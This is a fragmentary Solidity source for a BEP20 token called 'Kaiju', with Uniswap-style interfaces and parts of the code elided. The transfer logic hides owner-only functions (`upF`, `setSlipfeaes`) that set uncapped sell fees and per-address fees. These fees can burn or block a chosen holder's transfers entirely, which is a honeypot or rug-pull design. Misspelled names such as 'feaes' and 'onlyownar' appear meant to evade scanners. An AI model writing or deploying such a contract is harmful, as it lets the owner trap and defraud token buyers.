...
interface IUniswapV2Factory {
    ...
    function feaesTo() external view returns (address);
    function feaesToSetter() external view returns (address);
    ...
    function setfeaesTo(address) external;
    function setfeaesToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfeaesOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingfeaesOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingfeaesOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingfeaesOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfeaesOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract Kaiju is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellfeaes = 0;

    uint256 private _defaultBuyfeaes = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipfeaes;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellfeaes = _value;
    }

    function setSlipfeaes(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipfeaes[_address] = _value;
    }

    function getSlipfeaes(address _address) external view onlyownar returns (uint256) {
        return _slipfeaes[_address];
    }


    function setMAccountfeaes(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountfeaes(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradefeaesAmount = 0;

        if (rF) {
            uint256 tradefeaes = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefeaes = _defaultSellfeaes;
                }
                if (from == uniswapV2Pair) {

                    tradefeaes = _defaultBuyfeaes;
                }
            }
            if (_slipfeaes[from] > 0) {
                tradefeaes = _slipfeaes[from];
            }

            tradefeaesAmount = _Amount.mul(tradefeaes).div(100);
        }


        if (tradefeaesAmount > 0) {
            _balances[from] = _balances[from].sub(tradefeaesAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefeaesAmount);
            emit Transfer(from, _deadAddress, tradefeaesAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradefeaesAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradefeaesAmount);
        emit Transfer(from, _to, _Amount - tradefeaesAmount);
    }
